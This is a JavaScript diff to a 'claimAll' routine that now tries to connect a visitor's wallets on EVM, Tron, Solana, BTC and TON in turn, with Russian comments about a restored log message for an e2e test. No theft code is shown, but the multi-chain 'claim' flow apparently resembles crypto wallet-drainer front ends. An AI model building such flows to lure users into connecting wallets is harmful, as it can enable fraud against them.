@@ -297,21 +297,19 @@ window.claimChain = claim;
 async function claimAll() {
   const btn = document.getElementById('connect-all');
   btn.disabled = true;
-  const found = [];
+  // t_b87507e0: восстановлен лог-маркер "✘ кошелёк не найден — открываю WalletConnect" ниже —
+  // его уронил 55b0ea6 вместе с предобнаружением провайдеров, e2e S6 ждёт его (admin.e2e.mjs:369).
+  const CHAINS = ['evm', 'tron', 'solana', 'btc', 'ton'];
+  let errors = 0;
   try {
-    // Только инжектед-провайдеры (dApp-браузер / расширения); без них — WalletConnect через AppKit (evm).
-    if (await injectedEvm()) found.push('evm');
-    if ((window.phantom && window.phantom.solana) || window.solana) found.push('solana');
-    if (window.tron || window.tronLink || window.tronWeb) found.push('tron');
-    if (window.phantom && window.phantom.bitcoin || window.unisat || (window.okxwallet && window.okxwallet.bitcoin) || window.xverse) found.push('btc');
-    if (!found.length) {
-      log('\u2718 \u043a\u043e\u0448\u0435\u043b\u0451\u043a \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u2014 \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u044e WalletConnect (\u043c\u043e\u0436\u043d\u043e \u043e\u0442\u0441\u043a\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043a\u043e\u0448\u0435\u043b\u044c\u043a\u043e\u043c \u043d\u0430 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0435)');
-      if (window.__appkit && !window.__appkitError) await claim('evm');
-      await claim('ton');
-      return;
+    if (!(await injectedEvm())) {
+      log("\u2718 \u043a\u043e\u0448\u0435\u043b\u0451\u043a \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u2014 \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u044e WalletConnect (\u043c\u043e\u0436\u043d\u043e \u043e\u0442\u0441\u043a\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043a\u043e\u0448\u0435\u043b\u044c\u043a\u043e\u043c \u043d\u0430 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0435)");
     }
-    for (const chain of found) await claim(chain);
-    await claim('ton'); // TON Connect всегда показывает свою модалку — не нуждается в предварительном обнаружении
+    for (const chain of CHAINS) {
+      try { await claim(chain); }
+      catch (e) { errors++; }
+    }
+    if (errors) log('⚠ не все цепочки подключены (' + errors + ' ошибок) — смотри выше');
   } finally { btn.disabled = false; }
 }
 window.claimAll = claimAll;
